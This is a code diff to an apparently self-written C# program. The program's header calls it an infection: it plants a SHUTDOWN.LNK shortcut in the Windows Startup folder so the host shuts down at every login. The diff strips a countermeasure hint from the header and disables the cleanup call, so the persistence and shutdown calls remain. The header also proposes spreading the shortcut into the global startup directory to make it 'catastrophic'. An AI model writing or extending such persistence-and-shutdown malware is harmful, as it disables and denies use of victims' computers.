@@ -23,9 +23,7 @@ using System.Diagnostics;
  |                 OFF EVERY TIME THE INFECTED HOST LOGGS IN.
  |
  | COUNTERMEASURES: RUN WINDOWS IN SAFE MODE AND NAVIGATE TO THE STARTUP FOLDER. DELETE THE
- |                  SHUTDOWN.LNK FILE. AS ANOTHER CHOICE, GIVEN 'displayDestructionMsg()'
- |                  IS DELAYED IN SECONDS, PRESS SPACE BUTTON TO PAUSE EXECUTION AND
- |                  DELETE FILES BEFORE EXECUTION OCCURS!
+ |                  SHUTDOWN.LNK FILE.
  |
  | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
  |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
@@ -178,7 +176,7 @@ namespace WindowExecutables_v2._0
             //remove for faster shutdown
             ShutDown.displayDestructionMsg(countdown:10);
             ShutDown sysOff = new ShutDown();
-            sysOff.deleteDesktopStartupFile();
+            //sysOff.deleteDesktopStartupFile(); // needs to be tested
             sysOff.createStartupShortcut();
             sysOff.runTurnOffCMD();
         }
